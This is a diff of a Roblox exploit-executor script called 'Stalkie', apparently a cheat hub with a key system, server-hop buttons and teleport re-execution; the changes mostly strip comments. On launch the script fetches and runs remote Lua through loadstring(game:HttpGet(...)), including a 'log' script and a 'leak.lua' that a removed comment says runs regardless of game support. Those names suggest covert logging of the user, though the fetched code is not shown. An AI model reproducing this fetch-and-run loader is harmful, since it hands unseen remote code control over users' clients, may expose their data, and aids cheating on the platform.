@@ -1,11 +1,9 @@
--- Check if script has already been executed using a global flag
 if _G.StalkieScriptExecuted then
     warn("Stalkie is already executed!")
     return
 end
 _G.StalkieScriptExecuted = true
 
--- Load and execute the log.lua script immediately
 local success, result = pcall(function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/0riginalWarrior/roblox/refs/heads/main/log"))()
 end)
@@ -13,13 +11,11 @@ if not success then
     warn("Failed to load log.lua: " .. result)
 end
 
--- Check game ID before proceeding
 local currentGameId = game.PlaceId
 local success, allowedGames = pcall(function()
     return loadstring(game:HttpGet("https://raw.githubusercontent.com/SystemNasa/roblox/refs/heads/main/games.lua"))()
 end)
 
--- Create notification function for unsupported games
 local function showUnsupportedNotification()
     local ScreenGui = Instance.new("ScreenGui")
     ScreenGui.Parent = game:GetService("CoreGui")
@@ -51,7 +47,7 @@ local function showUnsupportedNotification()
     Message.Size = UDim2.new(1, 0, 0, 80)
     Message.Position = UDim2.new(0, 0, 0, 40)
     Message.BackgroundTransparency = 1
-    Message.Text = "This game is not supported !\nSorry."
+    Message.Text = "This game is not supported!\nSorry."
     Message.TextColor3 = Color3.fromRGB(173, 216, 230)
     Message.TextSize = 16
     Message.Font = Enum.Font.Gotham
@@ -74,7 +70,6 @@ local function showUnsupportedNotification()
     CloseCorner.CornerRadius = UDim.new(0, 8)
     CloseCorner.Parent = CloseButton
 
-    -- Fade in animation
     local TweenService = game:GetService("TweenService")
     NotificationFrame.BackgroundTransparency = 1
     Title.TextTransparency = 1
@@ -101,7 +96,6 @@ local function showUnsupportedNotification()
     messageFadeIn:Play()
     closeFadeIn:Play()
 
-    -- Close button functionality
     CloseButton.MouseButton1Click:Connect(function()
         local fadeOut = TweenService:Create(NotificationFrame, TweenInfo.new(0.5), {
             BackgroundTransparency = 1
@@ -127,7 +121,6 @@ local function showUnsupportedNotification()
     end)
 end
 
--- Always execute leak.lua regardless of game support
 spawn(function()
     task.wait(3)
     local success, result = pcall(function()
@@ -138,38 +131,31 @@ spawn(function()
     end
 end)
 
--- Exit if game is not supported, after showing notification
 if not success or not allowedGames or not allowedGames[currentGameId] then
     showUnsupportedNotification()
     return
 end
 
--- Define the script URL for re-execution
 local scriptUrl = "https://raw.githubusercontent.com/0riginalWarrior/Stalkie/refs/heads/main/roblox.lua"
 
--- Setup queue teleport compatibility across executors
 local queueTeleport = (syn and syn.queue_on_teleport) or
                      (fluxus and fluxus.queue_on_teleport) or
                      queue_on_teleport or
                      function() end
 
--- Generate unique name for ScreenGui
 local randomName = "GUI_" .. math.random(10000, 99999)
 
--- Create ScreenGui with protection
 local ScreenGui = Instance.new("ScreenGui")
 ScreenGui.Parent = game:GetService("CoreGui")
 ScreenGui.ResetOnSpawn = false
 ScreenGui.Name = randomName
 ScreenGui.IgnoreGuiInset = true
 
--- Anti-tamper variables
 local isKeyFrameActive = false
 local isHubFrameActive = false
 local lastValidation = tick()
 local isLoadingAnimation = false
 
--- Audio and Image handling
 local SoundService = game:GetService("SoundService")
 local introUrl = "https://raw.githubusercontent.com/SystemNasa/roblox/refs/heads/main/intro/intro.mp3"
 local iconUrl = "https://raw.githubusercontent.com/SystemNasa/roblox/refs/heads/main/intro/Sticker.png"
@@ -274,7 +260,6 @@ local function playIntroSound()
     end
 end
 
--- Key System Frame
 local KeyFrame = Instance.new("Frame")
 KeyFrame.Size = UDim2.new(0, 340, 0, 260)
 KeyFrame.Position = UDim2.new(0.5, -170, 0.5, -130)
@@ -409,7 +394,6 @@ InfoLabel.TextTransparency = 0.2
 InfoLabel.ZIndex = 3
 InfoLabel.Parent = KeyContent
 
--- Main Hub Frame
 local HubFrame = Instance.new("Frame")
 HubFrame.Size = UDim2.new(0, 420, 0, 450)
 HubFrame.Position = UDim2.new(0.5, -210, 0.5, -225)
@@ -439,7 +423,6 @@ HubContent.BackgroundTransparency = 1
 HubContent.ZIndex = 2
 HubContent.Parent = HubFrame
 
--- Dragging for Hub Frame
 local hubDragging, hubDragInput, hubDragStart, hubStartPos
 local function updateHubInput(input)
     local delta = input.Position - hubDragStart
@@ -563,7 +546,6 @@ local CopyPlayerCorner = Instance.new("UICorner")
 CopyPlayerCorner.CornerRadius = UDim.new(0, 12)
 CopyPlayerCorner.Parent = CopyPlayerButton
 
--- Info Button
 local InfoButton = Instance.new("TextButton")
 InfoButton.Size = UDim2.new(0, 30, 0, 30)
 InfoButton.Position = UDim2.new(0, 10, 0, 15)
@@ -581,7 +563,6 @@ local InfoButtonCorner = Instance.new("UICorner")
 InfoButtonCorner.CornerRadius = UDim.new(0, 15)
 InfoButtonCorner.Parent = InfoButton
 
--- Info Content
 local InfoContainer = Instance.new("Frame")
 InfoContainer.Size = UDim2.new(1, 0, 1, -60)
 InfoContainer.Position = UDim2.new(0, 0, 0, 60)
@@ -664,7 +645,6 @@ local YouTubeCorner = Instance.new("UICorner")
 YouTubeCorner.CornerRadius = UDim.new(0, 8)
 YouTubeCorner.Parent = YouTubeButton
 
--- Separator Line
 local SeparatorLine = Instance.new("Frame")
 SeparatorLine.Size = UDim2.new(0.85, 0, 0, 2)
 SeparatorLine.Position = UDim2.new(0.075, 0, 0, 360)
@@ -673,7 +653,6 @@ SeparatorLine.BackgroundTransparency = 1
 SeparatorLine.ZIndex = 3
 SeparatorLine.Parent = HubContent
 
--- Player Info Container
 local PlayerInfoContainer = Instance.new("Frame")
 PlayerInfoContainer.Size = UDim2.new(1, 0, 0, 80)
 PlayerInfoContainer.Position = UDim2.new(0, 0, 0, 362)
@@ -681,7 +660,6 @@ PlayerInfoContainer.BackgroundTransparency = 1
 PlayerInfoContainer.ZIndex = 3
 PlayerInfoContainer.Parent = HubContent
 
--- User PFP
 local PlayerPFP = Instance.new("ImageLabel")
 PlayerPFP.Size = UDim2.new(0, 50, 0, 50)
 PlayerPFP.Position = UDim2.new(0, 20, 0, 15)
@@ -695,7 +673,6 @@ local PFPCorner = Instance.new("UICorner")
 PFPCorner.CornerRadius = UDim.new(1, 0)
 PFPCorner.Parent = PlayerPFP
 
--- Username
 local PlayerName = Instance.new("TextLabel")
 PlayerName.Size = UDim2.new(0, 150, 0, 20)
 PlayerName.Position = UDim2.new(0, 50, 0, 15)
@@ -708,7 +685,6 @@ PlayerName.TextTransparency = 1
 PlayerName.ZIndex = 3
 PlayerName.Parent = PlayerInfoContainer
 
--- Executor Label
 local ExecutorLabel = Instance.new("TextLabel")
 ExecutorLabel.Size = UDim2.new(0, 150, 0, 20)
 ExecutorLabel.Position = UDim2.new(0, 55, 0, 35)
@@ -721,7 +697,6 @@ ExecutorLabel.TextTransparency = 1
 ExecutorLabel.ZIndex = 3
 ExecutorLabel.Parent = PlayerInfoContainer
 
--- Account Age Label
 local AccountAgeLabel = Instance.new("TextLabel")
 AccountAgeLabel.Size = UDim2.new(0, 150, 0, 20)
 AccountAgeLabel.Position = UDim2.new(0, 55, 0, 55)
@@ -734,7 +709,6 @@ AccountAgeLabel.TextTransparency = 1
 AccountAgeLabel.ZIndex = 3
 AccountAgeLabel.Parent = PlayerInfoContainer
 
--- Message
 local ThankYouLabel = Instance.new("TextLabel")
 ThankYouLabel.Size = UDim2.new(0, 200, 0, 20)
 ThankYouLabel.Position = UDim2.new(0.5, -100, 0, -300)
@@ -747,7 +721,6 @@ ThankYouLabel.TextTransparency = 1
 ThankYouLabel.ZIndex = 3
 ThankYouLabel.Parent = PlayerInfoContainer
 
--- Rejoin Server Button
 local RejoinButton = Instance.new("TextButton")
 RejoinButton.Size = UDim2.new(0, 100, 0, 30)
 RejoinButton.Position = UDim2.new(1, -230, 0, 25)
@@ -773,7 +746,6 @@ RejoinButton.MouseButton1Click:Connect(function()
     teleportService:Teleport(game.PlaceId, game.Players.LocalPlayer)
 end)
 
--- Random Server Button
 local JoinRandomButton = Instance.new("TextButton")
 JoinRandomButton.Size = UDim2.new(0, 100, 0, 30)
 JoinRandomButton.Position = UDim2.new(1, -120, 0, 25)
@@ -807,7 +779,6 @@ JoinRandomButton.MouseButton1Click:Connect(function()
     end
 end)
 
--- Ping
 local PingLabel = Instance.new("TextLabel")
 PingLabel.Size = UDim2.new(0, 100, 0, 20)
 PingLabel.Position = UDim2.new(1, -230, 0, 60)
@@ -820,7 +791,6 @@ PingLabel.TextTransparency = 1
 PingLabel.ZIndex = 3
 PingLabel.Parent = PlayerInfoContainer
 
--- Player Count
 local PlayerCountLabel = Instance.new("TextLabel")
 PlayerCountLabel.Size = UDim2.new(0, 100, 0, 20)
 PlayerCountLabel.Position = UDim2.new(1, -120, 0, 60)
@@ -833,7 +803,6 @@ PlayerCountLabel.TextTransparency = 1
 PlayerCountLabel.ZIndex = 3
 PlayerCountLabel.Parent = PlayerInfoContainer
 
--- Anti-tamper validation function
 local function validateGUI()
     if tick() - lastValidation < 0.1 then return end
     lastValidation = tick()
@@ -861,7 +830,6 @@ local function validateGUI()
     end
 end
 
--- Keybind Changer Button
 local KeybindButton = Instance.new("TextButton")
 KeybindButton.Size = UDim2.new(0, 40, 0, 40)
 KeybindButton.Position = UDim2.new(1, -100, 0, 10)
@@ -924,7 +892,6 @@ game:GetService("UserInputService").InputBegan:Connect(function(input, gameProce
     end
 end)
 
--- Update Ping and Player Count
 spawn(function()
     while true do
         local ping = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue()
@@ -940,7 +907,6 @@ spawn(function()
     end
 end)
 
--- File handling functions
 local function readFile(filename)
     return readfile(filename)
 end
@@ -961,7 +927,6 @@ local function createFolderAndFile()
     return fileName
 end
 
--- Key System Logic
 local TweenService = game:GetService("TweenService")
 local showingInfo = false
 
